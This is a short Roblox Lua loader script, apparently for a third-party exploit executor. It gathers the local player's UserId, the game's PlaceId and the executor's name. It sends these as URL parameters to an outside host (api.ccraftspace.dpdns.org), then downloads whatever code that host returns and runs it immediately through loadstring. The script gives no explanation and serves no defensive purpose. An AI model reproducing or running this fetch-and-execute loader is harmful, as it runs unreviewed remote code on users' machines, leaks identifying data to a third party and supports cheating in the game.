local l=game:GetService("Players").LocalPlayer
local o,x=pcall(function() return identifyexecutor() end)
local G=(getgenv and getgenv()) or _G
local p=(G.CCRAFT_PASS and G.CCRAFT_PASS["7d02b640"]) or ""
loadstring(game:HttpGet("https://api.ccraftspace.dpdns.org/p/7d02b640811b497a8d564d28c170f028?t=6adf42c9-c70ad714d744b84d734698b2-0-0-44af90bd-bcae6b27a139959d0e4ad4981727cad6&p="..p.."&u="..(l and l.UserId or 0).."&g="..game.PlaceId.."&x="..tostring(o and x or ""):gsub("%W","")))()